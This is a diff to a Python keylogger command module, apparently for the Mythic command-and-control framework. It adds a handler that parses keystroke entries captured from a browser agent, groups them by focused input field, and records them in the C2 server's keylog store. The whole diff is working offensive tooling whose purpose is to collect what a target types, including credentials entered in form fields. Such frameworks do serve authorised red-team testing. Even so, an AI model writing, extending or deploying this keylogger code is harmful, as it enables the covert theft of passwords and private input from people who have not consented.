@@ -48,4 +48,44 @@ class KeyloggerCommand(CommandBase):
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
         resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
+
+        try:
+            import json
+            data = json.loads(response)
+            entries = data.get("entries", [])
+            if entries:
+                # Group keystrokes by window/field
+                current_window = "Browser"
+                keystroke_buffer = ""
+                keylogs = []
+
+                for entry in entries:
+                    if entry.get("event") == "focus":
+                        # Flush previous buffer
+                        if keystroke_buffer:
+                            keylogs.append(MythicRPCKeylogData(
+                                WindowTitle=current_window,
+                                Keystrokes={"keys": keystroke_buffer}
+                            ))
+                            keystroke_buffer = ""
+                        current_window = entry.get("field", "Browser")
+                    elif entry.get("key"):
+                        keystroke_buffer += entry["key"]
+
+                # Flush remaining
+                if keystroke_buffer:
+                    keylogs.append(MythicRPCKeylogData(
+                        WindowTitle=current_window,
+                        Keystrokes={"keys": keystroke_buffer}
+                    ))
+
+                if keylogs:
+                    await SendMythicRPCKeylogCreate(MythicRPCKeylogCreateMessage(
+                        TaskID=task.Task.ID,
+                        Keylogs=keylogs
+                    ))
+        except Exception as e:
+            resp.Success = False
+            resp.Error = str(e)
+
         return resp
